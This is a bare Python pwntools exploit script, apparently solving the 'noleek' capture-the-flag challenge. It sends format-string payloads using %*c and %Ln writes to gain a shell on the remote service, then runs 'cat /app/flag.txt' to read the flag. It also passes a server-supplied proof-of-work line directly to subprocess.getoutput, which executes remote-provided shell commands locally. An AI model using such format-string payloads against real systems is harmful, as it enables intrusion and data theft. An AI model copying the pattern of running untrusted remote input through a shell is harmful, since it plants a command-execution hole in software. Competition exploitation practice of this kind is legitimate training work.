from pwn import *
import subprocess
context.binary=exe=ELF("./noleek",checksec=False)
#p=process(exe.path)
while(1):
	try:
		p=remote("challs.actf.co" ,31400)
		p.recvuntil(b"proof of work: ")
		foo = p.recvline().decode()
		print(foo)
		resultCapcha = subprocess.getoutput(foo)
		print(resultCapcha)
		p.sendline(resultCapcha)

		payload = b'%56c%*1$c%13$Ln\n'
		p.sendafter(b'leek? ', payload)
		payload = b'%678166c%*12$c%42$Ln\n'
		p.sendafter(b'more leek? ', payload)
		p.recvuntil(b'noleek.\n')
		p.sendline(b'cat /app/flag.txt')
		p.interactive()
	except:
		if (b'actf' in  p.recvall()):
			break